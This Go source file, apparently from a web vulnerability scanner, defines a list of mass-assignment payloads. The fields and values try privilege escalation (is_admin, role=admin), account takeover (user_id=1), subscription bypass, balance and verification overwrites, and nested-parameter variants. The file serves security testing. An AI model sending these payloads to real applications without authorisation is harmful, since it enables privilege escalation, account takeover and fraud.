package payloads

// MassAssignmentTest represents a single Mass Assignment test case.
type MassAssignmentTest struct {
	// Key is the name of the field to be injected.
	Key string
	// Value is the malicious value to be injected.
	Value interface{}
	// CheckType tells the scanner how to verify success.
	// Example: "bool_true", "string_match", "int_match"
	CheckType string
}

// MassAssignmentPayloads is the list of payloads to be tested for Mass Assignment vulnerabilities.
var MassAssignmentPayloads []MassAssignmentTest

func init() {
	MassAssignmentPayloads = []MassAssignmentTest{
		// --- Privilege Escalation ---
		{Key: "is_admin", Value: true, CheckType: "bool_true"},
		{Key: "isAdmin", Value: true, CheckType: "bool_true"},
		{Key: "isadmin", Value: true, CheckType: "bool_true"},
		{Key: "is_staff", Value: true, CheckType: "bool_true"},
		{Key: "isStaff", Value: true, CheckType: "bool_true"},
		{Key: "role", Value: "admin", CheckType: "string_match"},
		{Key: "Role", Value: "administrator", CheckType: "string_match"},
		{Key: "user_role", Value: "admin", CheckType: "string_match"},
		{Key: "userRole", Value: "superuser", CheckType: "string_match"},
		{Key: "account_type", Value: "admin", CheckType: "string_match"},
		{Key: "permissions", Value: "all", CheckType: "string_match"},
		{Key: "access_level", Value: 999, CheckType: "int_match"},
		{Key: "auth_level", Value: 100, CheckType: "int_match"},
		{Key: "admin", Value: 1, CheckType: "int_match"},
		{Key: "administrator", Value: true, CheckType: "bool_true"},

		// --- Ownership/Account Takeover ---
		{Key: "user_id", Value: 1, CheckType: "int_match"},
		{Key: "userId", Value: 1, CheckType: "int_match"},
		{Key: "owner_id", Value: 1, CheckType: "int_match"},
		{Key: "author_id", Value: 1, CheckType: "int_match"},

		// --- Subscription / Status Bypass ---
		{Key: "is_premium", Value: true, CheckType: "bool_true"},
		{Key: "is_pro", Value: true, CheckType: "bool_true"},
		{Key: "has_subscription", Value: true, CheckType: "bool_true"},
		{Key: "plan", Value: "premium", CheckType: "string_match"},
		{Key: "subscription_level", Value: "gold", CheckType: "string_match"},
		{Key: "paid_status", Value: "paid", CheckType: "string_match"},

		// --- Sensitive Data Overwriting (Verification, Balance, etc.) ---
		{Key: "verified", Value: true, CheckType: "bool_true"},
		{Key: "is_verified", Value: true, CheckType: "bool_true"},
		{Key: "email_verified", Value: true, CheckType: "bool_true"},
		{Key: "credit", Value: 999999, CheckType: "int_match"},
		{Key: "balance", Value: 999999, CheckType: "int_match"},
		{Key: "points", Value: 999999, CheckType: "int_match"},
		{Key: "locked", Value: false, CheckType: "bool_false"}, // Note the inverse check

		// --- Nested Parameter Syntax (Common in frameworks like Rails, Node.js) ---
		{Key: "user[is_admin]", Value: true, CheckType: "bool_true"},
		{Key: "user[role]", Value: "admin", CheckType: "string_match"},
		{Key: "profile[isAdmin]", Value: true, CheckType: "bool_true"},
		{Key: "account[type]", Value: "premium", CheckType: "string_match"},
	}
}
